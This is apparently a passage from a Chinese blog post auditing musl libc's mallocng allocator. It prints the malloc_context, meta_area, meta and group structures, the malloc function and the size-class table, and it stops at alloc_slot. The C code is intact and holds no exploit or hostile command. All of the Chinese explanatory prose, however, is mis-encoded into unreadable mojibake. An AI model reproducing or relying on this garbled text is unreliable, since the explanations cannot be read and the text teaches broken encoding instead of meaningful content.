<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">malloc_context</span> &#123;</span></span><br><span class="line">	<span class="type">uint64_t</span> secret;</span><br><span class="line"><span class="meta">#<span class="keyword">ifndef</span> PAGESIZE</span></span><br><span class="line">	<span class="type">size_t</span> pagesize;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">	<span class="type">int</span> init_done;</span><br><span class="line">	<span class="type">unsigned</span> mmap_counter;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">meta</span> *<span class="title">free_meta_head</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">meta</span> *<span class="title">avail_meta</span>;</span></span><br><span class="line">	<span class="type">size_t</span> avail_meta_count, avail_meta_area_count, meta_alloc_shift;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">meta_area</span> *<span class="title">meta_area_head</span>, *<span class="title">meta_area_tail</span>;</span></span><br><span class="line">	<span class="type">unsigned</span> <span class="type">char</span> *avail_meta_areas;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">meta</span> *<span class="title">active</span>[48];</span></span><br><span class="line">	<span class="type">size_t</span> usage_by_class[<span class="number">48</span>];</span><br><span class="line">	<span class="type">uint8_t</span> unmap_seq[<span class="number">32</span>], bounces[<span class="number">32</span>];</span><br><span class="line">	<span class="type">uint8_t</span> seq;</span><br><span class="line">	<span class="type">uintptr_t</span> brk;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p>è¿™ä¸ªç»“æ„ä½“æ˜¯musl libcçš„å †ç®¡ç†æœ€ä¸Šå±‚ç»“æ„ï¼Œå…¶ä¸­å­—æ®µçš„å«ä¹‰åˆ†åˆ«ä¸ºï¼š</p>
<ul>
<li><code>uint64_t secret</code>ï¼šä¸€ä¸ªéšæœºç”Ÿæˆçš„æ•°ï¼Œç”¨äºæ£€æŸ¥<code>meta</code>çš„åˆæ³•æ€§ï¼Œä¹Ÿå³ä¸€ä¸ªcheck guard</li>
<li><code>size_t pagesize</code>ï¼šé¡µå¤§å°ï¼Œåœ¨x86_64ä¸‹ä¸€èˆ¬ä¸ºä¸º0x1000</li>
<li><code>int init_done</code>ï¼šåˆ¤æ–­<code>malloc_context</code>æ˜¯å¦åˆå§‹åŒ–å®Œæˆï¼Œåœ¨<code>alloc_meta</code>å‡½æ•°ä¸­è¿›è¡Œæ£€æŸ¥ï¼Œå¦‚æœæ²¡æœ‰åˆ™è¿›è¡Œåˆå§‹åŒ–ï¼Œå¦åˆ™è·³è¿‡åˆå§‹åŒ–æµç¨‹</li>
<li><code>unsigned mmap_counter</code>ï¼šmmapè®¡æ•°å™¨ï¼Œé€šè¿‡mmapåˆ†é…äº†å¤šå°‘æ¬¡ç©ºé—´ç”¨äºå†…å­˜åˆ†é…</li>
<li><code>struct meta *free_meta_head</code>ï¼šè¢«é‡Šæ”¾çš„<code>meta</code>ç»“æ„ä½“æ„æˆçš„é“¾è¡¨è¡¨å¤´ï¼Œ<code>meta</code>ç»“æ„ä½“æ˜¯musl libcå†…å­˜åˆ†é…çš„ä½ä¸€çº§ç»“æ„ï¼Œåé¢ä¼šæåˆ°</li>
<li><code>struct meta *avail_meta</code>ï¼šç©ºé—²çš„<code>meta</code>ç»“æ„ä½“æ„æˆçš„é“¾è¡¨è¡¨å¤´</li>
<li><code>size_t avail_meta_count, avail_meta_area_count, meta_alloc_shift</code>ï¼š
<ul>
<li><code>size_t avail_meta_count</code>ï¼šç©ºé—²<code>meta</code>çš„æ•°é‡</li>
<li><code>size_t avail_meta_area_count</code>ï¼šç©ºé—²<code>meta_area</code>çš„æ•°é‡ï¼Œ<code>meta_area</code>æ˜¯<code>meta</code>çš„æ§åˆ¶ç»“æ„</li>
<li><code>size_t meta_alloc_shift</code>ï¼š&lt;æš‚ç¼º&gt;</li>
</ul>
</li>
<li><code>struct meta_area *meta_area_head, *meta_area_tail</code>ï¼š<code>meta_area</code>é“¾è¡¨è¡¨å¤´ï¼Œé“¾è¡¨è¡¨å°¾</li>
<li><code>unsigned char *avail_meta_areas</code>ï¼š&lt;æš‚ç¼º&gt;</li>
<li><code>struct meta *active[48]</code>ï¼šå¯ä»¥ç»§ç»­åˆ†é…çš„<code>meta</code></li>
<li><code>size_t usage_by_class[48]</code>ï¼šå¯¹åº”å¤§å°çš„ç¼“å­˜çš„æ‰€æœ‰<code>meta</code>çš„<code>group</code>æ‰€ç®¡ç†çš„chunkä¸ªæ•°</li>
<li><code>uint8_t unmap_seq[32], bounces[32]</code>ï¼š&lt;æš‚ç¼º&gt;</li>
<li><code>uint8_t seq</code>ï¼š&lt;æš‚ç¼º&gt;</li>
<li><code>uintptr_t brk</code>ï¼šè®°å½•ç›®å‰çš„<code>brk(0)</code></li>
</ul>
<p>å…¶ä¸­æœ‰ä¸€äº›å­—æ®µæ— æ³•é€šè¿‡ç®€å•æŸ¥çœ‹ä»£ç å¾—åˆ°ï¼Œéœ€è¦è¿›ä¸€æ­¥ä»£ç å®¡è®¡è·å–å…¶å«ä¹‰ï¼Œæˆ‘ä»¬åé¢å†è¿›è¡Œè¡¥å……ã€‚</p>
<h2 id="meta_area"><a class="markdownIt-Anchor" href="#meta_area"></a> meta_area</h2>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">meta_area</span> &#123;</span></span><br><span class="line">	<span class="type">uint64_t</span> check;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">meta_area</span> *<span class="title">next</span>;</span></span><br><span class="line">	<span class="type">int</span> nslots;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">meta</span> <span class="title">slots</span>[];</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p>è¿™ä¸ªç»“æ„ç”¨äºç®¡ç†ä¸€é¡µå†…çš„æ‰€æœ‰<code>meta</code>ç»“æ„ï¼Œå±äº<code>malloc_context</code>çš„ä¸‹çº§ç»“æ„ï¼Œ<code>meta</code>çš„ä¸Šçº§ç»“æ„ã€‚</p>
<ul>
<li><code>uint64_t check</code>ï¼šæ£€æŸ¥å­—æ®µï¼Œä¸<code>malloc_context</code>ä¸­çš„<code>secret</code>å­—æ®µå¯¹åº”ï¼Œæ£€æŸ¥è¯¥<code>meta_area</code>æ˜¯å¦å¯èƒ½è¢«ä¿®æ”¹</li>
<li><code>struct meta_area *next</code>ï¼šä¸‹ä¸€ä¸ª<code>meta_area</code>çš„åœ°å€ï¼Œæ„æˆé“¾è¡¨</li>
<li><code>int nslots</code>ï¼šè¯¥<code>meta_area</code>ä¸­ç®¡ç†çš„<code>meta</code>æ•°é‡ï¼Œä¸€èˆ¬ä¸ºå›ºå®šå€¼</li>
<li><code>struct meta slots[]</code>ï¼šç®¡ç†çš„<code>meta</code>æ•°ç»„</li>
</ul>
<h2 id="meta"><a class="markdownIt-Anchor" href="#meta"></a> meta</h2>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">meta</span> &#123;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">meta</span> *<span class="title">prev</span>, *<span class="title">next</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">group</span> *<span class="title">mem</span>;</span></span><br><span class="line">	<span class="keyword">volatile</span> <span class="type">int</span> avail_mask, freed_mask;</span><br><span class="line">	<span class="type">uintptr_t</span> last_idx:<span class="number">5</span>;</span><br><span class="line">	<span class="type">uintptr_t</span> freeable:<span class="number">1</span>;</span><br><span class="line">	<span class="type">uintptr_t</span> sizeclass:<span class="number">6</span>;</span><br><span class="line">	<span class="type">uintptr_t</span> maplen:<span class="number">8</span>*<span class="keyword">sizeof</span>(<span class="type">uintptr_t</span>)<span class="number">-12</span>;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p><code>meta</code>ä¸­ä¿å­˜æœ‰<code>group</code>ç»“æ„ä½“æŒ‡é’ˆï¼Œåè€…ç›´æ¥ä¿å­˜æœ‰éœ€è¦åˆ†é…çš„å†…å­˜å—ã€‚å³<code>meta</code>å’Œå…¶ç®¡ç†çš„å†…å­˜å—å¯èƒ½ä¸åœ¨åŒä¸€ä¸ªpageä¸­ã€‚</p>
<ul>
<li><code>struct meta *prev, *next</code>ï¼šå‰å<code>meta</code>ï¼Œæ„æˆåŒå‘é“¾è¡¨</li>
<li><code>struct group *mem</code>ï¼šç®¡ç†çš„<code>group</code>ç»“æ„ä½“æŒ‡é’ˆ</li>
<li><code>volatile int avail_mask, freed_mask</code>ï¼šæ©ç çš„å½¢å¼ï¼Œç”¨ä¸€ä¸ªbitè¡¨ç¤ºå­˜åœ¨ä¸å¦</li>
<li><code>uintptr_t last_idx:5</code>ï¼šè¯¥<code>meta</code>ä¸­æœ€åä¸€ä¸ªchunkçš„ç´¢å¼•</li>
<li><code>freeable:1</code>ï¼šè¯¥<code>meta</code>ä¸­çš„chunkæ˜¯å¦èƒ½å¤Ÿè¢«é‡Šæ”¾</li>
<li><code>uintptr_t sizeclass:6</code>ï¼šç®¡ç†çš„groupçš„å¤§å°ã€‚å¦‚æœmemæ˜¯mmapåˆ†é…ï¼Œå›ºå®šä¸º63</li>
<li><code>uintptr_t maplen:8*sizeof(uintptr_t)-12</code>ï¼šå¦‚æœç®¡ç†çš„groupæ˜¯mmapåˆ†é…çš„ï¼Œåˆ™ä¸ºå†…å­˜é¡µæ•°ï¼Œå¦åˆ™ä¸º0</li>
</ul>
<h2 id="group"><a class="markdownIt-Anchor" href="#group"></a> group</h2>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">group</span> &#123;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">meta</span> *<span class="title">meta</span>;</span></span><br><span class="line">	<span class="type">unsigned</span> <span class="type">char</span> active_idx:<span class="number">5</span>;</span><br><span class="line">	<span class="type">char</span> pad[UNIT - <span class="keyword">sizeof</span>(<span class="keyword">struct</span> meta *) - <span class="number">1</span>];</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">char</span> storage[];</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p><code>group</code>ä¸­å³ä¿å­˜æœ‰éœ€è¦åˆ†é…å‡ºå»çš„chunkã€‚</p>
<ul>
<li><code>struct meta *meta</code>ï¼šæ‰€å±çš„<code>meta</code>çš„åœ°å€</li>
<li><code>unsigned char active_idx:5</code>ï¼š5ä¸ªæ¯”ç‰¹ï¼Œè¡¨ç¤ºè¿˜æœ‰å¤šå°‘å¯ç”¨chunk</li>
<li><code>char pad[UNIT - sizeof(struct meta *) - 1]</code>ï¼šæ‰‹åŠ¨16å­—èŠ‚å¯¹é½</li>
<li><code>unsigned char storage[]</code>ï¼šè¦åˆ†é…å‡ºå»çš„å†…å­˜ç©ºé—´ï¼Œchunk</li>
</ul>
<hr />
<p>ä»¥ä¸Šå°±æ˜¯musl libcä¸­ä¸»è¦çš„æ•°æ®ç»“æ„ï¼Œä¸‹é¢æˆ‘ä»¬é€šè¿‡ä»£ç å®¡è®¡å½»åº•ææ¸…æ¥šmusl libcçš„å†…å­˜åˆ†é…æœºåˆ¶ã€‚</p>
<h1 id="2-ä»£ç å®¡è®¡"><a class="markdownIt-Anchor" href="#2-ä»£ç å®¡è®¡"></a> 2. ä»£ç å®¡è®¡</h1>
<p>æˆ‘ä»¬é¦–å…ˆä»å†…å­˜åˆ†é…ç›¸å…³çš„å‡½æ•°å¼€å§‹çœ‹èµ·ã€‚å¯¹äºè¾…åŠ©æ€§çš„è¾ƒä¸ºå¤æ‚çš„å‡½æ•°ä½¿ç”¨å°æ ‡é¢˜çš„å½¢å¼è¿›è¡Œåˆ†æï¼Œè¾…åŠ©æ€§çš„è¾ƒä¸ºç®€å•çš„å‡½æ•°åªåœ¨ç¬¬ä¸€æ¬¡å‡ºç°æ—¶ç›´æ¥å†™åˆ°ä¸»è¦å‡½æ•°åˆ†æä»£ç ä¸­è¿›è¡Œç®€å•è§£é‡Šã€‚</p>
<h2 id="mallocsrcmallocmallocngmallocc-line-299"><a class="markdownIt-Anchor" href="#mallocsrcmallocmallocngmallocc-line-299"></a> mallocï¼ˆ<code>/src/malloc/mallocng/malloc.c line 299</code>ï¼‰</h2>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> *<span class="title function_">malloc</span><span class="params">(<span class="type">size_t</span> n)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">if</span> (size_overflows(n)) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">meta</span> *<span class="title">g</span>;</span></span><br><span class="line">	<span class="type">uint32_t</span> mask, first;</span><br><span class="line">	<span class="type">int</span> sc;</span><br><span class="line">	<span class="type">int</span> idx;</span><br><span class="line">	<span class="type">int</span> ctr;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (n &gt;= MMAP_THRESHOLD) &#123;</span><br><span class="line">		<span class="type">size_t</span> needed = n + IB + UNIT;</span><br><span class="line">		<span class="type">void</span> *p = mmap(<span class="number">0</span>, needed, PROT_READ|PROT_WRITE,</span><br><span class="line">			MAP_PRIVATE|MAP_ANON, <span class="number">-1</span>, <span class="number">0</span>);</span><br><span class="line">		<span class="keyword">if</span> (p==MAP_FAILED) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">		wrlock();</span><br><span class="line">		step_seq();</span><br><span class="line">		g = alloc_meta();</span><br><span class="line">		<span class="keyword">if</span> (!g) &#123;</span><br><span class="line">			unlock();</span><br><span class="line">			munmap(p, needed);</span><br><span class="line">			<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		g-&gt;mem = p;</span><br><span class="line">		g-&gt;mem-&gt;meta = g;</span><br><span class="line">		g-&gt;last_idx = <span class="number">0</span>;</span><br><span class="line">		g-&gt;freeable = <span class="number">1</span>;</span><br><span class="line">		g-&gt;sizeclass = <span class="number">63</span>;</span><br><span class="line">		g-&gt;maplen = (needed+<span class="number">4095</span>)/<span class="number">4096</span>;</span><br><span class="line">		g-&gt;avail_mask = g-&gt;freed_mask = <span class="number">0</span>;</span><br><span class="line">		<span class="comment">// use a global counter to cycle offset in</span></span><br><span class="line">		<span class="comment">// individually-mmapped allocations.</span></span><br><span class="line">		ctx.mmap_counter++;</span><br><span class="line">		idx = <span class="number">0</span>;</span><br><span class="line">		<span class="keyword">goto</span> success;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	sc = size_to_class(n);</span><br><span class="line"></span><br><span class="line">	rdlock();</span><br><span class="line">	g = ctx.active[sc];</span><br><span class="line"></span><br><span class="line">	<span class="comment">// use coarse size classes initially when there are not yet</span></span><br><span class="line">	<span class="comment">// any groups of desired size. this allows counts of 2 or 3</span></span><br><span class="line">	<span class="comment">// to be allocated at first rather than having to start with</span></span><br><span class="line">	<span class="comment">// 7 or 5, the min counts for even size classes.</span></span><br><span class="line">	<span class="keyword">if</span> (!g &amp;&amp; sc&gt;=<span class="number">4</span> &amp;&amp; sc&lt;<span class="number">32</span> &amp;&amp; sc!=<span class="number">6</span> &amp;&amp; !(sc&amp;<span class="number">1</span>) &amp;&amp; !ctx.usage_by_class[sc]) &#123;</span><br><span class="line">		<span class="type">size_t</span> usage = ctx.usage_by_class[sc|<span class="number">1</span>];</span><br><span class="line">		<span class="comment">// if a new group may be allocated, count it toward</span></span><br><span class="line">		<span class="comment">// usage in deciding if we can use coarse class.</span></span><br><span class="line">		<span class="keyword">if</span> (!ctx.active[sc|<span class="number">1</span>] || (!ctx.active[sc|<span class="number">1</span>]-&gt;avail_mask</span><br><span class="line">		    &amp;&amp; !ctx.active[sc|<span class="number">1</span>]-&gt;freed_mask))</span><br><span class="line">			usage += <span class="number">3</span>;</span><br><span class="line">		<span class="keyword">if</span> (usage &lt;= <span class="number">12</span>)</span><br><span class="line">			sc |= <span class="number">1</span>;</span><br><span class="line">		g = ctx.active[sc];</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">for</span> (;;) &#123;</span><br><span class="line">		mask = g ? g-&gt;avail_mask : <span class="number">0</span>;</span><br><span class="line">		first = mask&amp;-mask;</span><br><span class="line">		<span class="keyword">if</span> (!first) <span class="keyword">break</span>;</span><br><span class="line">		<span class="keyword">if</span> (RDLOCK_IS_EXCLUSIVE || !MT)</span><br><span class="line">			g-&gt;avail_mask = mask-first;</span><br><span class="line">		<span class="keyword">else</span> <span class="keyword">if</span> (a_cas(&amp;g-&gt;avail_mask, mask, mask-first)!=mask)</span><br><span class="line">			<span class="keyword">continue</span>;</span><br><span class="line">		idx = a_ctz_32(first);</span><br><span class="line">		<span class="keyword">goto</span> success;</span><br><span class="line">	&#125;</span><br><span class="line">	upgradelock();</span><br><span class="line"></span><br><span class="line">	idx = alloc_slot(sc, n);</span><br><span class="line">	<span class="keyword">if</span> (idx &lt; <span class="number">0</span>) &#123;</span><br><span class="line">		unlock();</span><br><span class="line">		<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	g = ctx.active[sc];</span><br><span class="line"></span><br><span class="line">success:</span><br><span class="line">	ctr = ctx.mmap_counter;</span><br><span class="line">	unlock();</span><br><span class="line">	<span class="keyword">return</span> enframe(g, idx, n, ctr);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>å…¶ä¸­<code>MMAP_THRESHOLD</code>ç­‰äº131052ã€‚ç¬¬ä¸€ä¸ªåˆ¤æ–­å¦‚æœä¸ºçœŸï¼Œè¯´æ˜è¦åˆ†é…ä¸€å—å¾ˆå¤§çš„å†…å­˜ã€‚é¦–å…ˆè®¡ç®—ä¸€å…±éœ€è¦çš„å†…å­˜å¤§å°ï¼Œè¿™é‡Œ<code>IB</code>ç­‰äº4ã€<code>UNIT</code>ç­‰äº16ã€‚ç„¶åä½¿ç”¨<code>mmap</code>å‡½æ•°åˆ†é…ä¸€å—å†…å­˜ã€‚å¦‚æœåˆ†é…æˆåŠŸï¼Œä¸Šè¯»å†™é”ã€‚åé¢ä½¿ç”¨<code>alloc_meta</code>åˆ†é…ä¸€ä¸ª<code>meta</code>ç»™è¿™å—å¤§ç©ºé—´ï¼Œä¹‹åè®¾ç½®è¿™ä¸ª<code>meta</code>çš„ä¸€äº›åŸºæœ¬ä¿¡æ¯ã€‚</p>
<p>ä»è¿™ä¸ªifè¯­å¥æˆ‘ä»¬å¯ä»¥çŸ¥é“ï¼Œå¦‚æœä¸€æ¬¡å†…å­˜ç”³è¯·çš„å¤§å°è¿‡å¤§ï¼Œmusl libcä¼šä¸ºè¿™å—ç©ºé—´ä¸“é—¨åˆ†é…ä¸€ä¸ªmetaå’Œgroupï¼Œè¿™ä¸ªmetaå’Œgroupåªç®¡ç†è¿™ä¸€ä¸ªç©ºé—´ã€‚</p>
<p>å¦‚æœç”³è¯·çš„ç©ºé—´è¾ƒå°ï¼Œåˆ™è¿›å…¥ä¸‹é¢çš„ä»£ç ã€‚</p>
<p><code>sc = size_to_class(n);</code>è¿™æ¡è¯­å¥æ˜¯ä¸ºäº†è®¡ç®—è¿™ä¸ªå¤§å°çš„chunkåº”è¯¥è¢«åˆ†åˆ°å“ªä¸€ä¸ªclassã€‚</p>
<p>åœ¨muslä¸­å®šä¹‰æœ‰å¦‚ä¸‹å†…å®¹ï¼š</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// /src/malloc/mallocng/malloc.c, line 12</span></span><br><span class="line"><span class="type">const</span> <span class="type">uint16_t</span> size_classes[] = &#123;</span><br><span class="line">	<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">7</span>, <span class="number">8</span>,</span><br><span class="line">	<span class="number">9</span>, <span class="number">10</span>, <span class="number">12</span>, <span class="number">15</span>,</span><br><span class="line">	<span class="number">18</span>, <span class="number">20</span>, <span class="number">25</span>, <span class="number">31</span>,</span><br><span class="line">	<span class="number">36</span>, <span class="number">42</span>, <span class="number">50</span>, <span class="number">63</span>,</span><br><span class="line">	<span class="number">72</span>, <span class="number">84</span>, <span class="number">102</span>, <span class="number">127</span>,</span><br><span class="line">	<span class="number">146</span>, <span class="number">170</span>, <span class="number">204</span>, <span class="number">255</span>,</span><br><span class="line">	<span class="number">292</span>, <span class="number">340</span>, <span class="number">409</span>, <span class="number">511</span>,</span><br><span class="line">	<span class="number">584</span>, <span class="number">682</span>, <span class="number">818</span>, <span class="number">1023</span>,</span><br><span class="line">	<span class="number">1169</span>, <span class="number">1364</span>, <span class="number">1637</span>, <span class="number">2047</span>,</span><br><span class="line">	<span class="number">2340</span>, <span class="number">2730</span>, <span class="number">3276</span>, <span class="number">4095</span>,</span><br><span class="line">	<span class="number">4680</span>, <span class="number">5460</span>, <span class="number">6552</span>, <span class="number">8191</span>,</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p><code>size_to_class</code>çš„ä»£ç å¦‚ä¸‹ï¼š</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="keyword">inline</span> <span class="type">int</span> <span class="title function_">size_to_class</span><span class="params">(<span class="type">size_t</span> n)</span></span><br><span class="line">&#123;</span><br><span class="line">	n = (n+IB<span class="number">-1</span>)&gt;&gt;<span class="number">4</span>;</span><br><span class="line">	<span class="keyword">if</span> (n&lt;<span class="number">10</span>) <span class="keyword">return</span> n;</span><br><span class="line">	n++;</span><br><span class="line">	<span class="type">int</span> i = (<span class="number">28</span>-a_clz_32(n))*<span class="number">4</span> + <span class="number">8</span>;</span><br><span class="line">	<span class="keyword">if</span> (n&gt;size_classes[i+<span class="number">1</span>]) i+=<span class="number">2</span>;</span><br><span class="line">	<span class="keyword">if</span> (n&gt;size_classes[i]) i++;</span><br><span class="line">	<span class="keyword">return</span> i;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>å…¶ä¸­ç»è¿‡è¯•éªŒå¯çŸ¥<code>a_clz_32</code>è¿™ä¸ªå‡½æ•°è¿”å›çš„æ˜¯nçš„æœ€é«˜ä½æ˜¯32ä½ä¸­çš„å€’æ•°ç¬¬å‡ é«˜ä½ï¼ˆæœ€é«˜ä½ä¸º0ï¼‰ã€‚å¦‚<code>a_clz_32(1)=31</code>ï¼Œ<code>a_clz_32(2)=30</code>ï¼Œ<code>a_clz_32(4)=29</code>ï¼Œä»¥æ­¤ç±»æ¨ã€‚ç”±æ­¤æˆ‘ä»¬å¯ä»¥è®¡ç®—å‡ºä¸åŒå¤§å°çš„chunkå¯¹åº”äºå“ªä¸€ä¸ªç´¢å¼•ã€‚è¿™ä¸ªéƒ¨åˆ†å®é™…ä¸Šæ˜¯å°†chunkçš„å¤§å°æŒ‰ç…§æ•°ç»„æ¥è¿›è¡Œåˆ†ç»„ï¼Œæ•°ç»„çš„æ¯ä¸€é¡¹è¡¨ç¤ºè¿™ä¸€ç»„ä¸­chunkå³ç§»4ä½çš„å€¼ä¸èƒ½è¶…è¿‡å¤šå°‘ã€‚å¦‚ç´¢å¼•ä¸º10çš„æ•°ç»„å…ƒç´ å€¼ä¸º12ï¼Œå‰é¢ä¸€ä¸ªå…ƒç´ ä¸º10ï¼Œåˆ™ç¬¬10ç»„chunkçš„å¤§å°èŒƒå›´åº”è¯¥åœ¨0x100-0x11Fä¹‹é—´ã€‚åŒç†ï¼Œç¬¬11ç»„chunkçš„å¤§å°èŒƒå›´ä¸º0x120-0x14Fã€‚</p>
<p>ç´§æ¥ç€ï¼Œä¸Šè¯»å†™é”ã€‚åé¢<code>g = ctx.active[sc];</code>ä¸­çš„<code>ctx</code>æŒ‡çš„æ˜¯å…¨å±€<code>__malloc_context</code>ï¼Œå…¶<code>active</code>æ•°ç»„é•¿åº¦ä¸<code>size_classes</code>çš„ç›¸åŒï¼Œå‡ä¸º48ã€‚ç”±æ­¤å¯è§ï¼Œ<font color=red><strong>malloc_contextå°†metaä»¥ç®¡ç†çš„chunkå¤§å°è¿›è¡Œåˆ†ç»„ï¼Œåˆ†ç»„ä¾æ®<code>size_classes</code>è¿›è¡Œã€‚</strong></font></p>
<p>å†å¾€ä¸‹çš„ä¸€ä¸ªifè¯­å¥æœ‰å¾ˆå¤šçš„åˆ¤æ–­æ¡ä»¶ï¼Œåœ¨æŸäº›æ¡ä»¶æˆç«‹æ—¶ä¼šä¿®æ”¹<code>meta</code>æŒ‡é’ˆçš„å€¼ï¼Œå¯¹æ•´ä½“å½±å“ä¸å¤§ï¼Œå…ˆå‘ä¸‹çœ‹ã€‚</p>
<p>ä¸‹é¢æ˜¯ä¸€ä¸ªå¾ªç¯ã€‚<code>first = mask&amp;-mask;</code>æ˜¯å–<code>mask</code>çš„æœ€ä½1ä½ï¼Œå³lowbitï¼Œè¿™é‡Œçš„<code>avail_mask</code>å®é™…å°±æ˜¯é€‰ä¸­çš„<code>meta</code>æ‰€ç®¡ç†çš„<code>group</code>ä¸­chunkçš„å¯ç”¨ä½ï¼Œè¿™é‡Œæ˜¯é€šè¿‡å¯ç”¨ä½æ¥æŸ¥æ‰¾ç¬¬ä¸€ä¸ªå¯ç”¨çš„chunkã€‚å†…éƒ¨çš„if-elseè¯­å¥æ˜¯é’ˆå¯¹è¯»å†™é”è¿›è¡Œçš„æ£€æŸ¥ï¼Œæ— éœ€å…³æ³¨ã€‚å¦‚æœåœ¨è¿™é‡Œèƒ½å¤Ÿæ‰¾åˆ°å¯ç”¨çš„chunkï¼Œåˆ™å°†chunkçš„ç´¢å¼•ä¿å­˜åˆ°<code>idx</code>å˜é‡ä¸­ã€‚</p>
<p>å¦‚æœåœ¨è¿™ä¸ªå¾ªç¯ä¸­æ²¡æœ‰æ‰¾åˆ°åˆé€‚çš„<code>idx</code>ï¼Œåˆ™åœ¨å¾ªç¯å¤–è°ƒç”¨<code>alloc_slot</code>å‡½æ•°ï¼š</p>
